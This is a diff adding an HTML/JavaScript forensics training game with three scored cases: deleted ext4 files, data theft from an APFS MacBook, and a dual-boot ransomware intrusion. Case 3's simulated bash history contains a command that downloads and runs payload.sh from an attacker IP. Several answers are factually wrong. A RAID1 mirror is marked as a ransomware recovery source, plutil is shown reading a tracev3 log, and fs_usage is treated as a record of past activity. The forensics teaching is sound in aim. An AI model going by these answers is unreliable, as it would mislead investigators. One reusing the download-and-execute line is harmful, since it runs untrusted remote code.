@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Forensics Investigation: Operation File Trail</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .game-container {
+            background: rgba(26, 26, 46, 0.95);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            max-width: 900px;
+            width: 100%;
+            padding: 30px;
+            position: relative;
+        }
+
+        .terminal-header {
+            background: #000;
+            padding: 10px;
+            border-radius: 5px 5px 0 0;
+            margin: -30px -30px 20px -30px;
+            border-bottom: 2px solid #00ff00;
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 8px;
+            padding: 0 10px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .dot.red { background: #ff5f56; }
+        .dot.yellow { background: #ffbd2e; }
+        .dot.green { background: #27c93f; }
+
+        h1 {
+            color: #00ff00;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 2em;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            background: #000;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 0.9em;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+
+        .case-brief {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 4px solid #00ff00;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .evidence-window {
+            background: #000;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .evidence-window::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        .evidence-window::-webkit-scrollbar-track {
+            background: #111;
+        }
+
+        .evidence-window::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 5px;
+        }
+
+        .choices {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .choice-btn {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 15px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            font-size: 1em;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .choice-btn:hover {
+            background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            transform: translateX(10px);
+        }
+
+        .choice-btn::before {
+            content: '>';
+            position: absolute;
+            left: -20px;
+            transition: left 0.3s;
+        }
+
+        .choice-btn:hover::before {
+            left: 10px;
+        }
+
+        .result-message {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .result-message.success {
+            background: rgba(0, 255, 0, 0.1);
+            border: 2px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .result-message.failure {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            color: #ff0000;
+        }
+
+        .result-message.partial {
+            background: rgba(255, 255, 0, 0.1);
+            border: 2px solid #ffff00;
+            color: #ffff00;
+        }
+
+        .tools-panel {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .tools-panel.active {
+            display: block;
+        }
+
+        .tool-btn {
+            background: #111;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 8px 15px;
+            margin: 5px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+        }
+
+        .tool-btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+
+        .progress-tracker {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .progress-dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: #333;
+            transition: all 0.3s;
+        }
+
+        .progress-dot.completed {
+            background: #00ff00;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        .progress-dot.current {
+            background: #ffff00;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .start-screen, .case-screen, .end-screen {
+            display: none;
+        }
+
+        .start-screen.active, .case-screen.active, .end-screen.active {
+            display: block;
+        }
+
+        .start-btn, .next-btn, .restart-btn {
+            background: linear-gradient(135deg, #00ff00 0%, #00aa00 100%);
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            display: block;
+            margin: 30px auto;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .start-btn:hover, .next-btn:hover, .restart-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 255, 0, 0.4);
+        }
+
+        .final-report {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 5px;
+            border: 2px solid #00ff00;
+            margin: 20px 0;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #00ff00;
+            color: #000;
+            padding: 5px 10px;
+            border-radius: 3px;
+            margin: 5px;
+            font-weight: bold;
+        }
+
+        .intro-text {
+            color: #00ff00;
+            line-height: 1.8;
+            margin: 20px 0;
+        }
+
+        .ascii-art {
+            color: #00ff00;
+            text-align: center;
+            font-size: 0.8em;
+            margin: 20px 0;
+            line-height: 1.2;
+        }
+
+        .typing-effect {
+            overflow: hidden;
+            white-space: nowrap;
+            animation: typing 2s steps(40, end);
+        }
+
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        .hint-box {
+            background: rgba(255, 255, 0, 0.1);
+            border: 1px solid #ffff00;
+            color: #ffff00;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .hint-box.show {
+            display: block;
+        }
+
+        .score-display {
+            font-size: 1.5em;
+            color: #00ff00;
+            text-align: center;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="game-container">
+        <div class="terminal-header">
+            <div class="terminal-dots">
+                <div class="dot red"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+            </div>
+        </div>
+        
+        <h1>OPERATION: FILE TRAIL</h1>
+        <div class="typing-effect" style="text-align: center; color: #00ff00; margin-bottom: 20px;">
+            Digital Forensics Investigation Simulator
+        </div>
+
+        <!-- Start Screen -->
+        <div class="start-screen active">
+            <div class="ascii-art">
+<pre>
+    ___________.__.__           ___________            .__.__   
+    \_   _____/|__|  |   ____   \__    ___/_________  |__|  |  
+     |    __)  |  |  | _/ __ \    |    |  \_  __ \__  \ |  |  |  
+     |     \   |  |  |_\  ___/    |    |   |  | \// __ \|  |  |__
+     \___  /   |__|____/\___  >   |____|   |__|  (____  /__|____/
+         \/                 \/                         \/         
+</pre>
+            </div>
+            <div class="intro-text">
+                <p><strong>CLASSIFIED BRIEFING</strong></p>
+                <p>Agent, you've been assigned to our Digital Forensics Unit.</p>
+                <br>
+                <p>You'll investigate three critical cases involving compromised systems. Your expertise in Linux and macOS file systems will be essential.</p>
+                <br>
+                <p><strong>Your Tools:</strong></p>
+                <p>• File system analysis utilities</p>
+                <p>• Timestamp examination tools</p>
+                <p>• Inode and metadata readers</p>
+                <p>• Recovery software</p>
+                <br>
+                <p><strong>Mission Objectives:</strong></p>
+                <p>• Analyze evidence correctly</p>
+                <p>• Make informed investigative decisions</p>
+                <p>• Solve all three cases</p>
+            </div>
+            <button class="start-btn" onclick="startGame()">BEGIN INVESTIGATION</button>
+        </div>
+
+        <!-- Case Screen -->
+        <div class="case-screen">
+            <div class="status-bar">
+                <span>AGENT: <span class="badge">ACTIVE</span></span>
+                <span>CASE: <span id="case-number">1/3</span></span>
+                <span>SCORE: <span id="score">0</span> pts</span>
+            </div>
+
+            <div class="progress-tracker">
+                <div class="progress-dot" id="prog-1"></div>
+                <div class="progress-dot" id="prog-2"></div>
+                <div class="progress-dot" id="prog-3"></div>
+            </div>
+
+            <div id="case-content"></div>
+        </div>
+
+        <!-- End Screen -->
+        <div class="end-screen">
+            <div class="ascii-art">
+<pre>
+  __  __ ___ ___ ___ ___ ___  _  _ 
+ |  \/  |_ _/ __/ __|_ _/ _ \| \| |
+ | |\/| || |\__ \__ \| | (_) | .` |
+ |_|  |_|___|___/___/___\___/|_|\_|
+  ___ ___  __  __ ___ _    ___ _____ ___ 
+ / __/ _ \|  \/  | _ \ |  | __|_   _| __|
+| (_| (_) | |\/| |  _/ |__| _|  | | | _| 
+ \___\___/|_|  |_|_| |____|___| |_| |___|
+</pre>
+            </div>
+            <div class="score-display">
+                FINAL SCORE: <span id="final-score">0</span> / 300
+            </div>
+            <div class="final-report">
+                <h2 style="color: #00ff00; text-align: center;">INVESTIGATION REPORT</h2>
+                <div id="final-summary"></div>
+            </div>
+            <button class="restart-btn" onclick="restartGame()">NEW INVESTIGATION</button>
+        </div>
+    </div>
+
+    <script>
+        let currentCase = 0;
+        let score = 0;
+        let caseState = 0;
+        let decisions = [];
+
+        const cases = [
+            {
+                title: "Case 1: The Deleted Research",
+                stages: [
+                    {
+                        brief: "A university researcher claims someone deleted their critical research files from a Linux workstation (ext4 file system). The files were deleted 2 hours ago. The system is still running.",
+                        evidence: `$ df -T /home/researcher
+Filesystem     Type  1K-blocks     Used Available Use% Mounted on
+/dev/sda2      ext4  488384512 234521088 228962176  51% /home
+
+$ sudo debugfs /dev/sda2
+debugfs 1.46.5 (30-Dec-2021)
+debugfs: lsdel
+Inode  Owner  Mode    Size      Blocks   Time deleted
+873291   1001  100644  5242880   1283     Thu Nov  7 14:23:41 2024
+873295   1001  100644  2097152    513     Thu Nov  7 14:23:45 2024
+873301   1001  100644  8388608   2051     Thu Nov  7 14:23:48 2024`,
+                        question: "What's your immediate recovery strategy?",
+                        choices: [
+                            {
+                                text: "Immediately run 'rm -rf' recovery on the live system to undelete files",
+                                correct: false,
+                                feedback: "CRITICAL ERROR: 'rm -rf' would DELETE more files, not recover them! This could destroy evidence. You've potentially compromised the investigation.",
+                                points: 0
+                            },
+                            {
+                                text: "Create a forensic image of the partition first, then attempt recovery on the copy",
+                                correct: true,
+                                feedback: "EXCELLENT: Creating a forensic image preserves the current state and allows safe recovery attempts without risking further data loss.",
+                                points: 30
+                            },
+                            {
+                                text: "Use 'debugfs' to directly recover the inodes on the live system",
+                                correct: false,
+                                feedback: "RISKY: While debugfs can recover files, working on a live system risks overwriting the deleted data. Always image first.",
+                                points: 10
+                            },
+                            {
+                                text: "Reboot the system into recovery mode for better access",
+                                correct: false,
+                                feedback: "ERROR: Rebooting could cause the system to write data to disk, potentially overwriting the deleted files' data blocks.",
+                                points: 0
+                            }
+                        ]
+                    },
+                    {
+                        brief: "You've successfully created a forensic image. Analysis shows the deleted files' inodes are intact.",
+                        evidence: `debugfs: stat <873291>
+Inode: 873291   Type: regular    Mode: 0644   Flags: 0x80000
+User:  1001   Group:  1001   Size: 5242880
+Links: 0   Blockcount: 10264
+Fragment: Address: 0    Number: 0    Size: 0
+ctime: Thu Nov  7 14:23:41 2024 -- Thu Nov  7 14:23:41 2024
+atime: Thu Nov  7 10:15:23 2024
+mtime: Thu Nov  7 13:45:17 2024
+dtime: Thu Nov  7 14:23:41 2024
+EXTENTS:
+(0-1279): 23456000-23457279`,
+                        question: "The inode shows 'Links: 0' and has a dtime (deletion time). What does this tell you?",
+                        choices: [
+                            {
+                                text: "The file is corrupted and unrecoverable",
+                                correct: false,
+                                feedback: "INCORRECT: Links: 0 just means no directory entries point to this inode. The data blocks are likely intact.",
+                                points: 0
+                            },
+                            {
+                                text: "The file was deleted but the data blocks haven't been reallocated yet",
+                                correct: true,
+                                feedback: "CORRECT: Links: 0 with a dtime indicates proper deletion, but the extent information shows data blocks are still mapped. Recovery is highly likely.",
+                                points: 30
+                            },
+                            {
+                                text: "The file was moved to another partition",
+                                correct: false,
+                                feedback: "INCORRECT: A moved file wouldn't have Links: 0 and a deletion time. This is a deleted file.",
+                                points: 0
+                            },
+                            {
+                                text: "This is a hard link to another file",
+                                correct: false,
+                                feedback: "INCORRECT: Hard links would show Links > 0. This inode has no remaining links.",
+                                points: 5
+                            }
+                        ]
+                    },
+                    {
+                        brief: "Recovery was successful! But the researcher notices file modification times seem off.",
+                        evidence: `Recovered files:
+-rw-r--r-- 1 researcher staff 5242880 Nov  7 13:45 quantum_research.pdf
+-rw-r--r-- 1 researcher staff 2097152 Nov  7 13:45 experiment_data.csv
+-rw-r--r-- 1 researcher staff 8388608 Nov  7 13:45 simulation_results.dat
+
+$ stat quantum_research.pdf
+Access: 2024-11-07 10:15:23.000000000
+Modify: 2024-11-07 13:45:17.000000000
+Change: 2024-11-07 14:23:41.000000000`,
+                        question: "The mtime is before deletion, but ctime matches deletion time. What happened?",
+                        choices: [
+                            {
+                                text: "Someone backdated the files to hide tampering",
+                                correct: false,
+                                feedback: "UNLIKELY: mtime can be changed, but ctime updates automatically with any metadata change, including deletion.",
+                                points: 5
+                            },
+                            {
+                                text: "The ctime updated when the file was deleted (metadata change)",
+                                correct: true,
+                                feedback: "PERFECT: In ext4, ctime updates on ANY metadata change, including deletion. The mtime (content modification) remained unchanged. This is normal behavior.",
+                                points: 40
+                            },
+                            {
+                                text: "The recovery tool corrupted the timestamps",
+                                correct: false,
+                                feedback: "INCORRECT: These timestamps are preserved from the original inode. Recovery tools don't modify them.",
+                                points: 0
+                            },
+                            {
+                                text: "The system clock was wrong during deletion",
+                                correct: false,
+                                feedback: "INCORRECT: The ctime matches the dtime exactly, showing the system clock was consistent.",
+                                points: 0
+                            }
+                        ]
+                    }
+                ]
+            },
+            {
+                title: "Case 2: The MacBook Data Theft",
+                stages: [
+                    {
+                        brief: "A company suspects an employee copied confidential files before leaving. Their MacBook (APFS file system) was returned, but they claim all personal files were deleted.",
+                        evidence: `$ diskutil list
+/dev/disk1 (synthesized):
+   #:                       TYPE NAME          SIZE       IDENTIFIER
+   0:      APFS Container Scheme -             500.0 GB   disk1
+   1:                APFS Volume Macintosh HD  423.5 GB   disk1s1
+   2:                APFS Volume Preboot       352.3 MB   disk1s2
+   3:                APFS Volume Recovery      1.1 GB     disk1s3
+   4:                APFS Volume VM            8.0 GB     disk1s4
+
+$ tmutil listlocalsnapshots /
+com.apple.TimeMachine.2024-11-05-143022.local
+com.apple.TimeMachine.2024-11-06-090015.local
+com.apple.TimeMachine.2024-11-07-113342.local`,
+                        question: "You notice APFS snapshots exist. What's your first investigative step?",
+                        choices: [
+                            {
+                                text: "Delete the snapshots to free up space for analysis tools",
+                                correct: false,
+                                feedback: "TERRIBLE MISTAKE: APFS snapshots could contain the deleted files! Never delete potential evidence.",
+                                points: 0
+                            },
+                            {
+                                text: "Mount and examine the snapshots for deleted file recovery",
+                                correct: true,
+                                feedback: "EXCELLENT: APFS snapshots are point-in-time copies. Files deleted after the snapshot was taken will still exist in the snapshot.",
+                                points: 30
+                            },
+                            {
+                                text: "Format the drive to run recovery software",
+                                correct: false,
+                                feedback: "CATASTROPHIC: Formatting would destroy all evidence including snapshots. This would end your investigation.",
+                                points: 0
+                            },
+                            {
+                                text: "Ignore snapshots and scan for deleted files in unallocated space",
+                                correct: false,
+                                feedback: "INEFFICIENT: APFS uses copy-on-write, making traditional unallocated space recovery less effective. Snapshots are your best bet.",
+                                points: 10
+                            }
+                        ]
+                    },
+                    {
+                        brief: "Examining snapshots reveals files were present until yesterday. You find suspicious activity.",
+                        evidence: `$ ls -la@ /Volumes/com.apple.TimeMachine.2024-11-06-090015.local/Users/employee/Documents/
+-rw-r--r--@ 1 employee staff 15728640 Nov  5 16:45 client_database.xlsx
+    com.apple.quarantine  57
+    com.apple.metadata:kMDItemWhereFroms  523
+    
+$ xattr -p com.apple.metadata:kMDItemWhereFroms client_database.xlsx | xxd
+00000000: 6270 6c69 7374 3030 a201 0257 4169 7244  bplist00...WAirD
+00000010: 726f 7020 6672 6f6d 2065 6d70 6c6f 7965  rop from employe
+00000020: 6540 636f 6d70 616e 792e 636f 6d5f 0108  e@company.com
+
+$ log show --predicate 'process == "mds"' --last 48h | grep "USB"
+2024-11-06 15:32:18.234 Indexing mounted volume: KINGSTON_32GB
+2024-11-06 15:48:52.891 Unmounting volume: KINGSTON_32GB`,
+                        question: "Extended attributes show 'AirDrop from employee@company.com' and logs show USB activity. What likely happened?",
+                        choices: [
+                            {
+                                text: "The employee received the file via AirDrop then copied it to USB",
+                                correct: true,
+                                feedback: "CORRECT: The metadata proves the file was received via AirDrop from the employee's work email, then the USB mount/unmount times suggest data exfiltration.",
+                                points: 35
+                            },
+                            {
+                                text: "Someone else sent the file to frame the employee",
+                                correct: false,
+                                feedback: "UNLIKELY: The AirDrop came from the employee's own company email address, and coincides with USB activity.",
+                                points: 5
+                            },
+                            {
+                                text: "The USB was used for legitimate backup",
+                                correct: false,
+                                feedback: "SUSPICIOUS: AirDropping files to yourself then immediately using USB suggests circumventing security policies.",
+                                points: 10
+                            },
+                            {
+                                text: "The metadata is corrupted and unreliable",
+                                correct: false,
+                                feedback: "INCORRECT: Extended attributes in APFS are highly reliable and the format is valid.",
+                                points: 0
+                            }
+                        ]
+                    },
+                    {
+                        brief: "You need to prove what was copied to the USB drive. The Spotlight index might have traces.",
+                        evidence: `$ mdutil -s /
+/:
+    Indexing enabled.
+    
+$ mdfind -onlyin /.Spotlight-V100 "kMDItemFSName == '*.xlsx' || kMDItemFSName == '*.pdf'"
+(No current results - files deleted)
+
+$ strings /.Spotlight-V100/Store-V2/*/store.db | grep -A2 -B2 "KINGSTON"
+...
+client_database.xlsx
+financial_report_2024.pdf
+KINGSTON_32GB
+patents_confidential.docx
+source_code_backup.zip
+...
+
+$ fs_usage -f filesys | grep "KINGSTON"
+15:32:45 open    /Volumes/KINGSTON_32GB/client_database.xlsx
+15:33:12 open    /Volumes/KINGSTON_32GB/financial_report_2024.pdf  
+15:33:58 open    /Volumes/KINGSTON_32GB/patents_confidential.docx`,
+                        question: "Spotlight index and fs_usage logs show specific files copied to USB. What's your conclusion?",
+                        choices: [
+                            {
+                                text: "Inconclusive - need the actual USB drive to confirm",
+                                correct: false,
+                                feedback: "TOO CAUTIOUS: The Spotlight index and file system logs clearly show specific confidential files were accessed on the USB path.",
+                                points: 10
+                            },
+                            {
+                                text: "Clear evidence of data theft - multiple confidential files copied to external storage",
+                                correct: true,
+                                feedback: "PERFECT ANALYSIS: The evidence chain is complete - AirDrop receipt, USB mounting, specific file copies logged, then USB unmounting. This is data exfiltration.",
+                                points: 35
+                            },
+                            {
+                                text: "The employee was making authorized backups",
+                                correct: false,
+                                feedback: "UNLIKELY: Using personal USB for confidential data after AirDropping to personal account violates typical security policies.",
+                                points: 0
+                            },
+                            {
+                                text: "The logs could be from any USB device, not necessarily the employee's",
+                                correct: false,
+                                feedback: "INCORRECT: The timeline perfectly matches the employee's last day, and the device name is consistently 'KINGSTON_32GB'.",
+                                points: 5
+                            }
+                        ]
+                    }
+                ]
+            },
+            {
+                title: "Case 3: The Ransomware Investigation",
+                stages: [
+                    {
+                        brief: "A dual-boot system (Linux/macOS) was hit by ransomware. You need to determine the infection vector and timeline. Both operating systems are affected.",
+                        evidence: `Linux partition (ext4):
+$ ls -la /var/log/auth.log
+-rw-r----- 1 syslog adm 145289 Nov  7 03:45 auth.log
+
+$ tail /var/log/auth.log
+Nov 7 03:23:15 workstation sshd[8234]: Failed password for root from 185.234.218.XX 
+Nov 7 03:23:18 workstation sshd[8234]: Failed password for root from 185.234.218.XX
+Nov 7 03:23:21 workstation sshd[8234]: Accepted password for developer from 185.234.218.XX
+Nov 7 03:24:45 workstation sudo: developer : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+
+$ stat /home/*/Desktop/*.encrypted | grep Modify
+Modify: 2024-11-07 03:26:13.000000000
+Modify: 2024-11-07 03:26:15.000000000
+Modify: 2024-11-07 03:26:17.000000000`,
+                        question: "The auth.log shows successful SSH login followed by sudo access. What was the initial attack vector?",
+                        choices: [
+                            {
+                                text: "Email phishing with malware attachment",
+                                correct: false,
+                                feedback: "INCORRECT: The logs clearly show SSH brute force attempts followed by successful authentication. This was a remote access attack.",
+                                points: 0
+                            },
+                            {
+                                text: "SSH brute force attack that compromised weak credentials",
+                                correct: true,
+                                feedback: "CORRECT: Failed root attempts followed by successful 'developer' login from the same IP indicates credential compromise via brute force.",
+                                points: 30
+                            },
+                            {
+                                text: "Malicious USB device",
+                                correct: false,
+                                feedback: "INCORRECT: No evidence of USB activity. The auth.log clearly shows remote SSH access.",
+                                points: 0
+                            },
+                            {
+                                text: "Insider threat with legitimate credentials",
+                                correct: false,
+                                feedback: "UNLIKELY: The failed attempts before success suggest password guessing, not legitimate access.",
+                                points: 10
+                            }
+                        ]
+                    },
+                    {
+                        brief: "Now examining the macOS partition to understand the spread timeline.",
+                        evidence: `macOS partition (APFS):
+$ log show --predicate 'eventMessage contains "SSH"' --last 24h
+2024-11-07 03:28:41.234 sshd: Authentication succeeded for user 'developer' from 185.234.218.XX
+
+$ ls -la /Users/*/Desktop/*.encrypted
+-rw-r--r-- 1 developer staff 524288 Nov  7 03:31:22 important.docx.encrypted
+-rw-r--r-- 1 developer staff 1048576 Nov  7 03:31:24 records.xlsx.encrypted
+
+$ plutil -p /var/db/diagnostics/Persist/0000000000000001.tracev3 | grep LaunchServices
+"com.malicious.cryptolocker" => {
+    "LaunchTime" => 2024-11-07 03:30:15
+    "ParentProcess" => "Terminal"
+}
+
+$ cat /Users/developer/.bash_history | tail -5
+cd /Users/Shared
+curl -O http://185.234.218.XX/payload.sh
+chmod +x payload.sh
+./payload.sh
+rm payload.sh`,
+                        question: "The ransomware hit Linux at 03:26 and macOS at 03:31. How did it spread between systems?",
+                        choices: [
+                            {
+                                text: "Ransomware automatically scanned the network",
+                                correct: false,
+                                feedback: "INCORRECT: The bash history shows manual commands. This was human-operated ransomware.",
+                                points: 0
+                            },
+                            {
+                                text: "Shared partition was infected first",
+                                correct: false,
+                                feedback: "INCORRECT: No evidence of shared partition involvement. The attacker used SSH to access both systems.",
+                                points: 5
+                            },
+                            {
+                                text: "Attacker manually accessed macOS via SSH after compromising Linux",
+                                correct: true,
+                                feedback: "PERFECT: The timeline and bash history show the attacker compromised Linux first, then 5 minutes later SSHed into macOS and manually deployed the payload.",
+                                points: 35
+                            },
+                            {
+                                text: "Boot sector virus that affected both OSes",
+                                correct: false,
+                                feedback: "INCORRECT: Boot sector malware wouldn't leave SSH logs and bash history. This was clearly a remote access attack.",
+                                points: 0
+                            }
+                        ]
+                    },
+                    {
+                        brief: "You need to identify potential recovery options and determine what data might be salvageable.",
+                        evidence: `Combined analysis:
+
+Linux:
+$ cat /proc/mdstat
+md0 : active raid1 sdb1[1] sda1[0]
+      976773168 blocks super 1.2 [2/2] [UU]
+      
+$ hdparm -I /dev/sda | grep TRIM
+    *    Data Set Management TRIM supported (limit 8 blocks)
+    
+macOS:
+$ tmutil listlocalsnapshots /
+com.apple.TimeMachine.2024-11-06-230000.local (before infection)
+
+$ diskutil apfs listSnapshots disk1s1
++-- Snapshot Point: com.apple.TimeMachine.2024-11-06-230000.local
+    Snapshot Sealed: Yes
+    
+Linux backup found:
+$ ls -la /backup/
+drwxr-xr-x 2 root root 4096 Nov  5 02:00 daily_backup_2024-11-05/`,
+                        question: "Given the RAID1 on Linux, APFS snapshot on macOS, and backups, what's the best recovery strategy?",
+                        choices: [
+                            {
+                                text: "Pay the ransom to get the decryption key",
+                                correct: false,
+                                feedback: "NEVER RECOMMENDED: You have multiple recovery options. Paying ransom funds criminal operations and doesn't guarantee recovery.",
+                                points: 0
+                            },
+                            {
+                                text: "Restore Linux from RAID mirror and daily backup, restore macOS from APFS snapshot",
+                                correct: true,
+                                feedback: "OPTIMAL STRATEGY: RAID1 means you have a mirror, plus the Nov 5 backup for Linux. The sealed APFS snapshot from Nov 6 is pre-infection. Full recovery is possible!",
+                                points: 35
+                            },
+                            {
+                                text: "Format everything and start fresh",
+                                correct: false,
+                                feedback: "WASTEFUL: You have excellent recovery options available. Formatting would lose recoverable data unnecessarily.",
+                                points: 5
+                            },
+                            {
+                                text: "Try to crack the ransomware encryption",
+                                correct: false,
+                                feedback: "IMPRACTICAL: Modern ransomware uses strong encryption. With backups and snapshots available, restoration is the correct approach.",
+                                points: 10
+                            }
+                        ]
+                    }
+                ]
+            }
+        ];
+
+        function startGame() {
+            currentCase = 0;
+            score = 0;
+            caseState = 0;
+            decisions = [];
+            document.querySelector('.start-screen').classList.remove('active');
+            document.querySelector('.case-screen').classList.add('active');
+            loadCase();
+        }
+
+        function loadCase() {
+            updateProgress();
+            const caseData = cases[currentCase];
+            const stage = caseData.stages[caseState];
+            
+            let content = `
+                <div class="case-brief">
+                    <h2 style="color: #00ff00;">${caseData.title}</h2>
+                    <p>${stage.brief}</p>
+                </div>
+                <div class="evidence-window">${stage.evidence}</div>
+                <div class="case-brief">
+                    <p style="color: #ffff00;"><strong>⚡ ${stage.question}</strong></p>
+                </div>
+                <div class="choices">
+            `;
+            
+            stage.choices.forEach((choice, index) => {
+                content += `<button class="choice-btn" onclick="makeChoice(${index})">${choice.text}</button>`;
+            });
+            
+            content += `</div>
+                <div id="feedback"></div>
+                <div id="next-container"></div>`;
+            
+            document.getElementById('case-content').innerHTML = content;
+            document.getElementById('case-number').textContent = `${currentCase + 1}/3`;
+            document.getElementById('score').textContent = score;
+        }
+
+        function makeChoice(choiceIndex) {
+            const caseData = cases[currentCase];
+            const stage = caseData.stages[caseState];
+            const choice = stage.choices[choiceIndex];
+            
+            // Disable all choice buttons
+            document.querySelectorAll('.choice-btn').forEach(btn => {
+                btn.disabled = true;
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'default';
+            });
+            
+            // Show feedback
+            let feedbackClass = choice.correct ? 'success' : (choice.points > 0 ? 'partial' : 'failure');
+            let feedbackHTML = `
+                <div class="result-message ${feedbackClass}">
+                    <p><strong>${choice.correct ? '✓ EXCELLENT ANALYSIS' : (choice.points > 0 ? '⚡ PARTIAL CREDIT' : '✗ INCORRECT ANALYSIS')}</strong></p>
+                    <p>${choice.feedback}</p>
+                    <p><strong>Points earned: ${choice.points}</strong></p>
+                </div>
+            `;
+            
+            document.getElementById('feedback').innerHTML = feedbackHTML;
+            
+            score += choice.points;
+            document.getElementById('score').textContent = score;
+            
+            decisions.push({
+                case: caseData.title,
+                stage: caseState,
+                correct: choice.correct,
+                points: choice.points
+            });
+            
+            // Show next button
+            let nextHTML = `<button class="next-btn" onclick="nextStage()">Continue Investigation →</button>`;
+            document.getElementById('next-container').innerHTML = nextHTML;
+        }
+
+        function nextStage() {
+            caseState++;
+            
+            if (caseState >= cases[currentCase].stages.length) {
+                currentCase++;
+                caseState = 0;
+                
+                if (currentCase >= cases.length) {
+                    endGame();
+                    return;
+                }
+            }
+            
+            loadCase();
+        }
+
+        function updateProgress() {
+            document.querySelectorAll('.progress-dot').forEach((dot, index) => {
+                dot.classList.remove('current', 'completed');
+                if (index < currentCase) {
+                    dot.classList.add('completed');
+                } else if (index === currentCase) {
+                    dot.classList.add('current');
+                }
+            });
+        }
+
+        function endGame() {
+            document.querySelector('.case-screen').classList.remove('active');
+            document.querySelector('.end-screen').classList.add('active');
+            
+            document.getElementById('final-score').textContent = score;
+            
+            let performance = '';
+            let rank = '';
+            const percentage = (score / 300) * 100;
+            
+            if (percentage >= 90) {
+                rank = 'SENIOR FORENSIC ANALYST';
+                performance = 'Outstanding investigation! You\'ve demonstrated expert-level knowledge of Linux and macOS file systems. Your analytical skills are exceptional.';
+            } else if (percentage >= 75) {
+                rank = 'FORENSIC ANALYST';
+                performance = 'Excellent work! You successfully solved the cases with strong technical knowledge. Minor areas for improvement in evidence analysis.';
+            } else if (percentage >= 60) {
+                rank = 'JUNIOR ANALYST';
+                performance = 'Good effort! You show solid understanding but need more practice with file system forensics and evidence interpretation.';
+            } else if (percentage >= 40) {
+                rank = 'TRAINEE ANALYST';
+                performance = 'You have foundational knowledge but need significant improvement in forensic analysis techniques and file system understanding.';
+            } else {
+                rank = 'NEEDS TRAINING';
+                performance = 'Consider reviewing file system structures, forensic procedures, and evidence analysis techniques before attempting real investigations.';
+            }
+            
+            let summary = `
+                <p style="text-align: center; font-size: 1.3em; color: #00ff00; margin: 20px 0;">
+                    <strong>RANK ACHIEVED:</strong><br>
+                    <span style="font-size: 1.5em;">${rank}</span>
+                </p>
+                <p style="margin: 20px 0;">${performance}</p>
+                <div style="margin-top: 20px;">
